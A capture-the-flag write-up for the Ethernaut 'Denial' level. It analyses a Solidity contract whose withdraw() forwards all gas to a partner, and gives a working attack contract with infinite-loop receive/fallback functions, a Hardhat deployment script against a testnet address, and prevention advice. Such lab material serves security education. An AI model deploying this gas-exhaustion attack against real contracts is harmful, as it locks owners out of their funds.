# Ethernaut - Denial Level

## Level Introduction

The Denial level requires you to become the contract's partner and prevent the owner from withdrawing funds. Even though the contract has sufficient funds and the transaction gas limit is 1M or less, you must ensure that the owner cannot successfully execute the withdraw() function.

## Target Contract Analysis

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## Vulnerability Analysis

The main vulnerability in this contract lies in the `partner.call{value: amountToSend}("")` method in the `withdraw()` function:

1. **Gas Limit Issue**:
   - The contract uses the `call` method for transfers without setting a gas limit
   - Therefore, the partner contract can consume all available gas in the transaction

2. **Execution Order Issue**:
   - The contract executes the partner's transfer first, then the owner's transfer
   - If the partner transfer step consumes all gas, subsequent steps cannot execute

3. **Lack of Fund Protection Mechanism**:
   - The contract has no mechanism to prevent malicious partners from consuming too much gas
   - No emergency withdrawal mechanism is provided for the owner

## Attack Method

We can create a malicious contract whose `receive()` or `fallback()` function deliberately consumes all available gas, making the `withdraw()` function unable to complete execution, thus preventing the owner from receiving funds.

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract AttackDenial {
    // Target Denial contract
    IDenial public target;
    
    constructor(address _target) {
        target = IDenial(_target);
    }
    
    // Set ourselves as partner
    function attack() external {
        target.setWithdrawPartner(address(this));
    }
    
    // Consume all gas when receiving ether
    receive() external payable {
        // Use infinite loop to consume all gas
        while(true) {}
    }
    
    // Backup receive function in case receive is not triggered
    fallback() external payable {
        // Also use infinite loop to consume all gas
        while(true) {}
    }
}
```

### Deployment and Attack Script

```typescript
import hre from "hardhat";
const { ethers } = hre;

async function main() {
    console.log("Starting Denial contract attack script...");

    // Target contract address
    const targetAddress = "0xBBa23DbF343d46966D990dc7245577D3681ba12B";
    
    // Deploy attack contract
    const attackFactory = await ethers.getContractFactory("AttackDenial");
    const attackContract = await attackFactory.deploy(targetAddress);
    await attackContract.waitForDeployment();
    
    // Execute attack, set attack contract as partner
    await attackContract.attack();
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

## Attack Principle

1. We deploy the `AttackDenial` contract and pass the target Denial contract address to the constructor
2. Through the `attack()` function, we set the attack contract as the Denial contract's partner
3. When the Denial contract executes `withdraw()`, it sends funds to the attack contract
4. The attack contract's `receive()` function executes an infinite loop, consuming all available gas
5. Due to gas exhaustion, the Denial contract cannot complete execution to the owner transfer part
6. Therefore, the owner cannot withdraw funds, and we successfully prevent the withdraw operation

## Execute Attack

```shell
npx hardhat run scripts/attackDenial.ts --network optimismSepolia
```

## Prevention Measures

To prevent similar vulnerabilities, contract developers should:

1. **Limit Gas Usage**:
   - Use `call{gas: specificAmount}` to limit gas forwarded to external contracts
   - Or use `transfer()` or `send()` methods (built-in 2300 gas limit)

2. **Use Pull Pattern**:
   - Switch to "pull" rather than "push" mode for sending funds
   - Let recipients call withdrawal functions themselves instead of actively sending

3. **Checks-Effects-Interactions Pattern**:
   - Perform all state changes first, then interact with external contracts last
   - This way, even if external calls fail, the state has been correctly updated

4. **Add Emergency Withdrawal Mechanism**:
   - Provide emergency withdrawal functions for the owner
   - Bypass normal withdrawal process in special circumstances

## Learning Insights

This level demonstrates the dangers of the `call` method in Solidity: it forwards all available gas and doesn't automatically revert. In contrast, the `transfer` and `send` methods limit gas to 2300 units, which can reduce the risk of such attacks.

In summary, when handling fund transfers, always carefully design interaction patterns and follow verified security patterns.
